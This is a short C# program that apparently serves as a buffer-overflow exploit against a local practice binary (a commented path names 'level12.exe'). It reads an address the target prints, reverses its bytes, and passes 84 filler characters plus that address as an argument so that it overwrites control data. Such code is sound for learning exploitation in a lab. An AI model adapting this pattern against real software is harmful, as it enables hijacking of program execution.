using System.Diagnostics;
using System.Text;

namespace CallerApp;

public class Program
{

    static async Task Main(string[] args)
    {
        //string exePath = @"..\..\..\..\level12.exe";
        string exePath = @"..\..\..\..\CPPApp\Debug\CPPApp.exe";

        string addr = await CallExe(exePath, "1");
        string clearAddr = addr[2..].Trim();
        byte[] clearAddrBytes = Convert.FromHexString(clearAddr).Reverse().ToArray();

        StringBuilder sb = new();
        sb.Append('1', 84);
        foreach (var b in clearAddrBytes)
        {
            sb.Append((char)b);
        }

        _ = await CallExe(exePath, sb.ToString(), false);
    }

    static async Task<string?> CallExe(string path, string args, bool ro = true)
    {
        try
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = path,
                UseShellExecute = false,
                RedirectStandardOutput = ro,
                RedirectStandardError = ro,
                Arguments = args
            };

            using (Process process = new())
            {
                process.StartInfo = startInfo;
                process.Start();

                if (ro)
                {
                    string output = await process.StandardOutput.ReadToEndAsync();
                    string error = await process.StandardError.ReadToEndAsync();

                    Console.WriteLine(output);
                    if (!string.IsNullOrEmpty(error))
                    {
                        Console.WriteLine(error);
                    }
                    await process.WaitForExitAsync();
                    return output;
                }

                return null;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
            return null;
        }
    }
}
